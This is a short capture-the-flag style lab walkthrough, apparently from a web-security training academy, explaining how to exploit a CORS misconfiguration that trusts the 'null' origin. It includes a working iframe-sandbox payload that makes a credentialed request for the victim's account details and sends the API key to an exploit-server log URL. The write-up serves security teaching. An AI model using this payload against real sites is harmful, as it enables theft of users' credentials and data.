# Lab: CORS vulnerability with trusted null origin

Log in and notice that the user's api key is displayed on the account page. Check the proxy history to see that the /my-account request makes a request to /accountDetails to retrieve this information. Send the request to the repeater and add the header `Origin: null`. Notice that the response reflects the origin in the `Access-Control-Allow-Origin` header, indicating that there is a CORS vulnerability.

Use the following script to deliver to the victim via the exploit server, where the target website is accessed and logged on the malicious server:
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="data:text/html,<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://ac2b1f291e193163c0ab42bc00b30040.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
    location='//exploit-acca1f061ef43187c09e427e01260052.web-security-academy.net/log?response='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

This uses an iframe sandbox to generate a null origin request. 

Check the access log to see the response and find the api key. Submit to complete the lab.